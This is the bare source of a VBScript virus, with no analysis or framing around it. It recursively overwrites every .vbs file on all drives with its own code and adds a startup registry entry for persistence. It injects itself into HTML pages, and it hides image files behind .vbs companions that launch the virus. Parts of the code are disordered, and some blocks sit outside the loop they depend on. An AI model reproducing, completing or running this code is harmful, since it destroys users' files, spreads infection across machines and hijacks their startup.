set mvbswe = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then
fso.Copyfile Wscript.Scriptfullname,file.path
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next
end function
mvbswe.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32" , "C:\windows\system32.vbs"
If fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="shtml" then
set a = fso.opentextfile(file.path,2)
l = a.readline
if l <> "<!---->" then
b = a.readall
set c = fso.opentextfile(Wscript.scriptfullname)
bc = c.readall
c.close
a.writeline "<!---->"
a.writeline "<html><Body><Script language=" & chr(34) & "VBScript" & chr(34) & ">"
a.write bc
a.writeline "<" & chr(47) & "script></body></html>"
a.write b
a.close
end if
end if
If fso.GetExtensionName(file.path)="bmp" or fso.GetExtensionName(file.path)="jpg" or fso.GetExtensionName(file.path)="gif" or fso.GetExtensionName(file.path)="ico" then
on error resume next
set fso = createobject("scripting.filesystemobject")
set mvbswe = wscript.CreateObject("wscript.shell")
set tes = fso.opentextfile(Wscript.Scriptfullname,1)
scr = tes.readall
bathelp = file.path & ".bat"
Set dropper = Fso.Createtextfile(bathelp, True)
dropper.writeline "Attrib +h " & file.path
dropper.Close
mvbswe.run bathelp
Fso.Deletefile bathelp
vbscopy = file.path & ".vbs"
Set dropper2 = Fso.Createtextfile(vbscopy, True)
dropper2.write "CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ").run " & chr(34) & file.path & chr(34) & vbcrlf
dropper2.write scr
dropper2.Close
end if

